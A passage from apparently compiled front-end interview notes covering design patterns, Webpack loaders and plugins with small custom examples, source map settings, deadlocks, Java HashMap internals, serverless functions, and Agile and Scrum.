The Decorator pattern allows for behavior to be added to individual objects, either statically or dynamically, without affecting the behavior of other objects from the same class. This pattern is similar to Aspect-Oriented Programming (AOP) and is supported in ES and TypeScript through decorator syntax. It's particularly useful for adding features or functionalities to existing classes without modifying them.

**Example**:
```typescript
@testable
class MyTestableClass {
    // ...
}

function testable(target) {
    target.isTestable = true;
}

console.log(MyTestableClass.isTestable);
```
In the example above, `@testable` is a decorator that adds new functionality to `MyTestableClass`.

## What's the distinction between the Observer pattern and the Publish-Subscribe pattern?

### Observer Pattern
In the Observer pattern, the subject (the object being observed) and the observers (the objects that want to be notified of changes in the subject) have direct knowledge of each other. This means there is a direct relationship where the subject holds references to the observers and directly notifies them of any changes. This pattern allows for a straightforward and direct communication line but can lead to higher coupling between the subject and its observers.

#### Characteristics:
- **Direct Communication**: Observers are directly registered with the subject.
- **Coupling**: There is a higher degree of coupling, as the subject and observers are directly aware of each other.
- **Use Case**: Suitable for simpler scenarios where the subject's state change is of interest to specific observers directly related to the subject.

### Publish-Subscribe Pattern
The Publish-Subscribe pattern, on the other hand, introduces a middle layer known as the "event channel" or "message broker," which decouples the publishers (the sources of events) from the subscribers (the receivers of events). Publishers publish events to the event channel without knowing who the subscribers will be. Similarly, subscribers listen for events through the event channel without knowing who the publishers are. This level of indirection adds flexibility and reduces coupling between components, making the system more scalable and easier to extend.

#### Characteristics:
- **Indirect Communication**: The communication between publishers and subscribers is mediated by an event channel, without direct knowledge of each other.
- **Coupling**: There is lower coupling due to the presence of the event channel as an intermediary.
- **Use Case**: Ideal for more complex scenarios where the event source and event consumers need to remain decoupled for scalability and maintainability reasons.

In summary, the key difference lies in the relationship and communication method between the parties involved: the Observer pattern facilitates direct communication between the subject and its observers, resulting in tighter coupling, whereas the Publish-Subscribe pattern uses an event channel to mediate communication, leading to looser coupling and greater flexibility.

## Iterator Pattern
The iterator pattern is a design pattern in object-oriented programming that allows sequential access to the elements of an aggregate object without exposing its underlying structure. This pattern is particularly useful in JavaScript, where it forms the basis of iterable objects that can be looped over with constructs like `for...of`.

### Context in JavaScript

Introduced with ES6 (ECMAScript 2015), iterators in JavaScript are integral to handling collections of data, especially when the collection size is not predetermined or elements are generated dynamically. An iterator in JavaScript is an object that provides a `next()` method returning an object with properties:
- `value`: represents the next element in the sequence.
- `done`: a boolean indicating whether the sequence has been fully traversed.

### Implementing an Iterator

Creating an iterable object in JavaScript involves defining a `Symbol.iterator` method, which returns an iterator. This method is automatically invoked by JavaScript's newer syntax features such as the `for...of` loop.

#### Example: Range Iterator

```javascript
// Define a range object that is iterable using the iterator pattern
const range = {
  start: 1,
  end: 5,

  [Symbol.iterator]() {
    let current = this.start;
    return {
      next: () => {
        if (current <= this.end) {
          return { value: current++, done: false };
        } else {
          return { done: true };
        }
      }
    };
  }
};

// Iterate over the range using a for...of loop
for (let num of range) {
  console.log(num);  // Outputs: 1, 2, 3, 4, 5
}
```

### Usage in Modern JavaScript

Iterators are foundational to many built-in JavaScript structures such as:
- **Arrays**
- **Strings**
- **Maps**
- **Sets**

These structures use iterators implicitly in language features like `for...of` loops, array destructuring, spread syntax, and others.

### Advantages of Using Iterators

1. **Abstraction**: Provides a unified interface for element access, shielding clients from complex underlying data structures.
2. **Decoupling**: Separates data structures from the algorithms used on them, increasing modularity.
3. **Flexibility**: Allows algorithms to operate on diverse data structures simply by adhering to the iterator protocol.


# 10. Environment and DevOps.md

## Webpack Overview
Webpack is a vital tool for modern JavaScript applications, acting as a static module bundler. It analyzes modules and their dependencies to generate static assets, optimizing the web application's loading process.

### Module Dependency Management
Webpack's strength lies in its efficient handling of dependencies. For example, consider three interconnected modules: Module A relies on Module B, which in turn depends on Module C. Webpack will bundle these modules into a single file, significantly enhancing loading efficiency by reducing the number of server requests needed.

### Code Compilation
Webpack supports various file types and languages, facilitating seamless code transformation and integration. For instance, it can convert TypeScript (TSX) files to JavaScript (JSX), and LESS files to CSS. This flexibility helps maintain a smooth development process across different technologies.

### Development Efficiency
One of Webpack’s key features is hot reloading, which automatically updates modules in the browser when developers save changes. This feature streamlines the development workflow by providing instant feedback, thereby accelerating the development cycle.

### Project Optimization
Webpack can significantly reduce file sizes through compression and optimization techniques. Utilizing plugins, it can minify and gzip output files, enhancing download speeds and overall application performance. This optimization is crucial for improving user experience in production environments.

## Loaders in Webpack
Loaders are integral to the Webpack ecosystem, enabling the transformation of files from one format to another during the build process. This feature allows developers to incorporate various file types into the dependency graph of their applications, enhancing functionality and efficiency.

### JavaScript-related Loaders
- **`babel-loader`**: Transforms newer versions of JavaScript (ES6 and beyond) into the more broadly supported ES5 format. This ensures compatibility across various browsers and environments.
- **`ts-loader`** or **`awesome-typescript-loader`**: Converts TypeScript into JavaScript, facilitating seamless integration with Webpack’s build pipeline.
- **`eslint-loader`**: Integrates linting into the build process, promoting high code quality standards.
- **`source-map-loader`**: Supports debugging efforts by processing JavaScript source maps. This allows developers to trace back minified code to its original form, simplifying troubleshooting.

### CSS-related Loaders
- **`css-loader`**: Handles CSS dependencies by resolving `@import` and `url()` paths within CSS files, treating them as JavaScript modules.
- **`style-loader`**: Injects CSS directly into the DOM via `<style>` tags, enabling immediate style updates without external style sheets.
- **`sass-loader`**, **`less-loader`**: These loaders transform SASS/SCSS and LESS code into standard CSS, streamlining the development of complex stylesheets.
- **`postcss-loader`**: Applies enhancements to CSS through plugins such as Autoprefixer, which optimizes CSS for cross-browser compatibility.

### File-related Loaders
- **`file-loader`**, **`url-loader`**: These loaders manage file imports by generating URLs and converting files into DataURLs if they are below a specified size, optimizing web performance.
- **`image-webpack-loader`**: Reduces image file sizes without compromising quality, crucial for maintaining fast load times.
- **`gzip-loader`**: Compresses assets using the Gzip algorithm to further decrease loading times.

### Other Loaders
- **`html-loader`**: Processes HTML files by treating them as strings, which improves handling of asset URLs.
- **`raw-loader`**: Imports files as raw text, useful for certain custom manipulations.
- **`svg-inline-loader`**: Integrates SVGs directly into HTML documents, enhancing performance and handling of these graphics.
- **`markdown-loader`**: Transforms Markdown into HTML, allowing Markdown to be used directly in web projects.

### Loader Execution Order
Understanding the execution order of loaders is essential for proper configuration. Loaders in Webpack process from right to left (or bottom to top when configured in an array). This order means that the last loader in the sequence modifies its input first before passing it to the next loader.

**Example Configurations:**
```js
module: {
  rules: [
    {
      test: /\.tsx?$/,
      use: ['babel-loader', 'ts-loader']
    },
    {
      test: /\.css$/,
      use: ['style-loader', 'css-loader']
    }
  ]
}
```

**Execution Sequences:**
- **TypeScript Files**: `ts-loader` compiles TypeScript first, followed by `babel-loader` which transpiles to ES5.
- **CSS Files**: `css-loader` manages imports and URLs first, then `style-loader` injects the styles into the webpage.

## How to Implement a Webpack Loader

### Setting Up Webpack
1. **Initialization**:
   Ensure that you have Node.js installed on your system. Then, initiate your project with npm:
   ```bash
   npm init -y
   ```
   This command creates a `package.json` file in your project directory.

2. **Installing Webpack**:
   Install webpack and webpack-cli as development dependencies:
   ```bash
   npm install webpack webpack-cli -D
   ```

### Configuration File
Create a `webpack.config.js` file in your project root:
```javascript
const path = require('path');

module.exports = {
    entry: './src/index.js', // Entry file
    mode: 'development', // Development mode
    module: {
        rules: [
            {
                test: /\.js$/, // Target js files
                use: ['uglify-loader'] // Use custom loader
            }
        ]
    },
    resolveLoader: {
        modules: [path.resolve(__dirname, 'loaders'), 'node_modules']
    }
};
```
### Loader Implementation
Implement the custom loader in `loaders/uglify-loader.js`:
```javascript
const UglifyJS = require('uglify-js');

module.exports = function(source) {
    const result = UglifyJS.minify(source);
    return result.code; // Return minified code
};
```

### Build Script
Add a build script in your `package.json` to simplify the build process:
```json
"scripts": {
    "build": "webpack"
}
```

### Building the Project
Execute the build process using npm:
```bash
npm run build
```
This command will compile your source files using webpack and the specified loader, outputting the results to `dist/main.js`.

### Testing the Output
Check the `dist/main.js` file to verify that your JavaScript code has been minified successfully.

## Webpack Plugins Overview
https://webpack.js.org/plugins/

Webpack plugins are integral to enhancing the functionality of Webpack, the prominent JavaScript module bundler. These plugins facilitate a broad spectrum of tasks across bundle optimization, asset management, and environment variable injection. By hooking into Webpack's compilation lifecycle, they allow developers to customize behavior throughout the bundling process.

### Commonly Used Webpack Plugins

Explore some of the most frequently employed Webpack plugins designed to streamline both development and production workflows:

1. **HtmlWebpackPlugin**  
   Automates the creation of HTML files to serve webpack bundles, efficiently managing script injections and CSS linking.

2. **MiniCssExtractPlugin**  
   Extracts CSS into separate files for each JavaScript file containing CSS, supporting individual CSS and SourceMaps for modules.

3. **DefinePlugin**  
   Facilitates the creation of global constants configurable at compile time, enhancing the differentiation between development and production behaviors.

4. **CleanWebpackPlugin**  
   Cleans up the build folder(s) prior to building, ensuring that only necessary files are generated, thereby avoiding the accumulation of outdated files.

5. **TerserWebpackPlugin**  
   Utilizes Terser to minimize JavaScript files, optimizing load times and reducing bandwidth consumption.

6. **CompressionWebpackPlugin**  
   Generates compressed versions of assets, which can be served with Content-Encoding, particularly beneficial in production to minimize asset sizes.

7. **DllPlugin** and **DllReferencePlugin**  
   These plugins enable bundle splitting to significantly enhance build time performance by allowing vendor bundles to be compiled once and reused.

8. **HotModuleReplacementPlugin**  
   Supports Hot Module Replacement (HMR), facilitating module exchange, addition, or removal during runtime without a full page reload.

9. **ProvidePlugin**  
   Automatically loads modules, eliminating the need for explicit imports or requires, which can be useful for globally accessing certain libraries.

### Plugin Execution Order

- **Sequential and Parallel Execution**: Plugins are generally applied in the order they are listed in the Webpack configuration. While some hooks operate sequentially (e.g., `apply` methods), others are executed in parallel, which means plugins operate independently unless coordinated through asynchronous mechanisms.

## How to Implement a Webpack Plugin

### Overview
Webpack plugins are integral for extending the build features and functionalities of webpack. This section will guide you through the steps of implementing a custom webpack plugin within a basic project setup.

### Initial Setup
**Project Configuration**
1. Initialize your project by setting up the `webpack.config.js` file:
    ```js
    const path = require('path');

    module.exports = {
        entry: './src/index.js',
        mode: 'development',
    }
    ```
2. Install the necessary webpack packages:
    ```bash
    npm i webpack-cli webpack -D
    ```
3. Configure the `package.json` to include a build script:
    ```json
    "scripts": {
        "build": "webpack"
    }
    ```

### Plugin Implementation
**Creating a Custom Plugin**
1. Define your custom plugin in `plugin/LogPlugin.js`. Ensure to import necessary modules:
    ```js
    const json = require('format-json');
    const fs = require('fs');

    class LogPlugin {
        constructor(options) {
            this.options = options;
            console.log(options);
        }

        // 'compiler' refers to the webpack compiler instance
        apply(compiler) {
            compiler.hooks.done.tapAsync('getStats', (stats, callback) => {
                const statsJson = stats.toJson();
                const plainlog = json.plain(statsJson);
                const outputPath = this.options.outputPath;
                fs.writeFileSync(outputPath, plainlog);
                callback();
            });
        }
    }

    module.exports = LogPlugin;
    ```

**Integrating the Plugin with Webpack**
1. Update the `webpack.config.js` to utilize the newly created plugin:
    ```js
    const path = require('path');
    const MyLogPlugin = require('./plugin/LogPlugin');

    module.exports = {
        entry: './src/index.js',
        mode: 'development',
        plugins: [
            new MyLogPlugin({
                outputPath: path.resolve(__dirname, 'webpack.log.json')
            })
        ]
    }
    ```

### Building the Project
**Running the Build Process**
1. Install any dependencies if not already installed:
    ```bash
    npm install
    ```
2. Execute the build command to generate the output:
    ```bash
    npm run build
    ```

### Results
After running the build process, the log file generated by the custom plugin can be found in the root directory of your project. This file contains the JSON formatted build statistics, providing insights into the build process.

## Webpack Build Process

**1. Combine Initial Parameters:** Begin by merging user-supplied parameters from configuration files and command line arguments. This step ensures that Webpack operates with a complete set of instructions tailored to the specific build.

**2. Initialize Compiler:** Create a compiler instance that handles file watching (for changes) and triggers recompilations. The complete Webpack configuration is included here to guide the compilation process.

**3. Load Plugins:** Sequentially load and initialize each plugin. Plugins extend Webpack's capabilities and are crucial for tasks like optimization and environment variable injection. Each plugin's `apply` method is called with the compiler object as an argument, allowing it to hook into the Webpack lifecycle.

**4. Find File Entry:** Identify the entry point file(s) and construct a dependency graph that represents how files interact and depend on one another.

**5. Invoke Loaders:** Process the source code through loaders. Loaders transform the files before they are added to the dependency graph. For example, Babel-loader transforms JSX and ES6+ syntax into plain JavaScript.

**6. Output the Final Product:** Combine all modules and output the final bundled file(s). This step involves optimizations like minification and chunk splitting to improve load times.

## Understanding and Configuring Source Maps

Source maps are files that provide a way of mapping code within a compressed or minified file back to its original source. This is particularly useful in JavaScript where the production code is often obfuscated and minified to reduce load times and improve performance. When an error occurs in such scripts, the source map allows developers to see the original code instead of the minified or obfuscated version, thus making debugging much easier.

**Benefits of Source Maps**

- **Debugging**: Converts obfuscated or minified code references back into the original source code, enabling easier debugging.
- **Error Tracking**: Allows you to trace errors and logs in the production environment back to the exact place in the source code where they were generated.

**How to Locate a Source Map**

Source maps can typically be identified and accessed in one of two ways:

1. By the source mapping URL comment at the end of a JavaScript file, which looks like this: `//# sourceMappingURL=jquery.min.map`.
2. By a `.map` file located in the same directory as the JavaScript file, e.g., `jquery.min.map`.

### Configuring Source Maps with Webpack

Webpack offers various options for generating source maps, controlled through the `devtool` configuration property. Here are the common settings:

- **`source-map`**: Generates a separate `.map` file and appends a sourceMappingURL comment to the end of the JavaScript file.
- **`eval-source-map`**: Each module is executed with `eval()` and a SourceMap is added as a DataUrl to the eval.
- **`inline-source-map`**: Adds a DataUrl containing the sourcemap to the JavaScript file.
- **`cheap-source-map`**: Generates a source map that includes line numbers only, not column mappings.
- **`eval-cheap-source-map`**: Similar to `cheap-source-map`, but uses `eval()` and does not produce a separate `.map` file.

**Code Example for Webpack Configuration**

```javascript
// File: build/webpack.prod.js
module.exports = {
  devtool: 'source-map'
};
```

Running `npm run build` will generate the source map file in the distribution folder. The generated `.map` file will be referenced at the bottom of the JavaScript file:

```javascript
//# sourceMappingURL=bundle.xxx.js.map
```

### Best Practices for Source Map Usage

- **Development Environment**: Use configurations like `eval`, `eval-source-map`, or `eval-cheap-source-map` for faster build and rebuild speed. Alternatively, source maps may be omitted entirely if not needed for initial development testing.
- **Production Environment**: Use `source-map` to enable detailed debugging capabilities without exposing the source code directly within the JavaScript files.
- **Open Source Projects**: Source maps should be available to aid other developers in debugging and understanding the codebase.
- **Proprietary Projects**: Avoid distributing source maps in production to protect the source code. External visibility of source maps can lead to reverse engineering and potential code leakage.
# 11. Other.md

## Understanding Deadlocks
Deadlocks can occur in any system where shared resources are accessed concurrently. However, in the context of front-end development, this typically relates to asynchronous tasks and resource loading.

#### Necessary Conditions for Deadlock
To grasp how deadlocks occur and prevent them, it's essential to understand the following conditions, adapted from general computing to the web development context:

- **Mutual Exclusion**: A resource cannot be shared and is exclusively held by one process at a time. In web development, this could translate to exclusive access to the DOM or single-threaded operations in JavaScript where certain operations cannot run simultaneously due to browser limitations.

- **Hold and Wait**: A process is holding at least one resource and is waiting to acquire additional resources that are currently being held by other processes. For example, a JavaScript event loop might be waiting for a fetch API response while holding onto DOM access until the fetch is completed.

- **No Preemption**: A resource can only be released voluntarily by the process holding it, not forcibly taken away. This is akin to JavaScript promises which cannot be canceled once initiated; they must resolve or reject.

- **Circular Wait**: There exists a set of processes, each of which is waiting for a resource held by another process in the set, creating a circular chain of dependencies. In the context of web applications, this might happen when multiple asynchronous JavaScript operations are waiting on each other to release some resource, like API data or access to IndexedDB.

## Java HashMap Overview

### Storage Structure
**Key Storage:** Java's `HashMap` stores data in an array of nodes, each node being a "bucket." These buckets may contain multiple entries linked together by a common array index, resulting in a structure known as chained bucketing.
**Node Composition:** Each node in the chain comprises a key-value pair, the key's hash code, and a reference to the next node, enabling efficient navigation and retrieval.

### Hash Function
**Initial Hashing:** Keys are first processed using their `hashCode()` method, which generates a preliminary hash code.
**Supplemental Hashing:** To minimize clustering—an issue with some native hash functions—a supplemental hash function further processes the initial hash. This determines the exact index in the array where the entry should be stored, enhancing key distribution across the buckets.

### Handling Key Conflicts
**Chaining Mechanism:** When multiple keys hash to the same index, the `HashMap` utilizes a linked list to manage these collisions. Each new entry is added to the end of the list at that particular index, maintaining a retrievable sequence of entries.

### Expansion of Array Length
**Trigger for Expansion:** The array is resized—typically doubling in size—when the number of entries exceeds 75% of the array's current capacity. This threshold is known as the load factor.
**Rehashing Process:** Post-expansion, all existing entries must be rehashed to the new, larger array. This ensures entries are redistributed according to the new array size, though it is computationally demanding.

### Conversion to Red-Black Tree
**Conditions for Conversion:** If a bucket becomes overly populated (typically when it holds more than eight entries), it is converted from a linked list to a red-black tree. This enhances search efficiency within that bucket.
**Reversion to Linked List:** Should the number of entries in a bucket fall below the threshold, the structure reverts to a linked list to maintain performance balance.

## Benefits of Using Cloud Functions like Google Cloud Compared to Traditional Front-end/Back-end Separation

Cloud functions, such as those provided by Google Cloud, offer several advantages over the traditional front-end/back-end separation architecture. These benefits stem from cloud functions' ability to operate in a serverless environment, which changes how applications are built, deployed, and scaled. Below, we detail these benefits:

### Cost Efficiency
- **Google Cloud Functions** operate on a pay-as-you-go model, where charges are incurred only when the code is executed. This is particularly beneficial for applications with fluctuating traffic, as it aligns operational costs directly with actual usage, avoiding the need to pay for idle resources.

### Simplified Management
- **Serverless Architecture**: With Google Cloud Functions, there's no need to manage servers. Google handles all the infrastructure management tasks, including maintenance, patching, and security. In contrast, traditional architectures, even when utilizing virtual or cloud servers, require developers or operations teams to manage server configuration and upkeep.

### Automatic Scaling
- **Adaptability to Traffic**: Google Cloud Functions automatically scale based on the number of requests. This ensures that during peak traffic periods, more resources are allocated to handle increased concurrent requests, and during low traffic times, resources are reduced to save costs. Traditional models often require manual intervention or additional automation tools for scaling.

### Rapid Iteration
- **Development Agility**: The serverless model enables developers to quickly create and deploy code without worrying about underlying infrastructure. This supports faster development cycles and rapid iteration, whereas traditional deployment models might involve complex configuration and deployment processes.

### Integration and Automation
- **Seamless Ecosystem Connectivity**: Google Cloud Functions can be easily integrated with other services and tools within the Google Cloud Platform (GCP), such as Google Cloud Pub/Sub and Google Cloud Storage. This facilitates the creation of end-to-end automated solutions, streamlining the development process and enhancing functionality.

### Event-Driven Architecture
- **Responsive Microservices**: Google Cloud Functions inherently support an event-driven architecture, directly responding to events from Google Cloud services, like file uploads to Google Cloud Storage or messages published to Google Cloud Pub/Sub. This model is ideal for building highly decoupled and responsive microservices, as it allows services to react immediately to changes and triggers within the ecosystem.

## Agile Development

### Overview
Agile development is a software and product development methodology that prioritizes flexibility, iterative progress, and continuous improvement. It promotes the delivery of small, workable segments of a project frequently. This approach allows development teams to respond swiftly and efficiently to changes in project requirements or priorities.

### Principles
Agile development is based on several core principles:
- **Customer satisfaction** through early and continuous delivery of valuable software.
- **Welcoming changing requirements**, even late in development.
- **Delivering working software frequently**, from a couple of weeks to a couple of months, with a preference for the shorter timescale.
- **Daily cooperation** between business people and developers.
- **Supporting and trusting** individuals to get the job done.
- **Face-to-face conversation** as the most efficient and effective method of conveying information.
- **Maintaining a constant pace** indefinitely.
- **Continuous attention** to technical excellence and good design.
- **Simplicity**—the art of maximizing the amount of work not done—is essential.
- **Self-organizing teams** which produce the best architectures, requirements, and designs.
- **Regular reflection** on how to become more effective, then tuning and adjusting behavior accordingly.

### Benefits
The benefits of Agile development include:
- **Increased flexibility and adaptability** to change.
- **Enhanced product quality** due to frequent testing and revisions.
- **Higher customer satisfaction** through the delivery of products that better meet customer needs and preferences.
- **Improved project predictability** and reduced risks.

## Scrum Methodology

### Scrum Master Role
The Scrum Master is a key facilitator within the Scrum methodology, a prominent Agile framework. This role involves:
- **Facilitating the Scrum process**: Helping the development team work cohesively.
- **Removing impediments**: Addressing any obstacles that prevent the team from achieving their sprint goals.
- **Ensuring clear communication**: Acting as a bridge between stakeholders and the development team to ensure all parties are aligned.

### Responsibilities
The Scrum Master's responsibilities are not akin to those of a traditional project manager. Instead, they include:
- **Coaching the team**: Providing guidance to all team members, including the Product Owner, on Scrum practices.
- **Promoting Scrum values**: Encouraging and supporting the adoption of Scrum, including its iterative development and feedback loops.
- **Protecting the team from external interruptions**: Ensuring that the team can focus on their current sprint tasks.

### Challenges
Some common challenges faced by Scrum Masters include:
- **Managing complex team dynamics** and ensuring smooth collaboration.
- **Handling resistance to Scrum practices**: Particularly from team members unfamiliar with or skeptical of Agile methods.
- **Balancing multiple roles**: Sometimes, Scrum Masters might need to address conflicts or fulfill multiple roles depending on team needs and organizational structure.
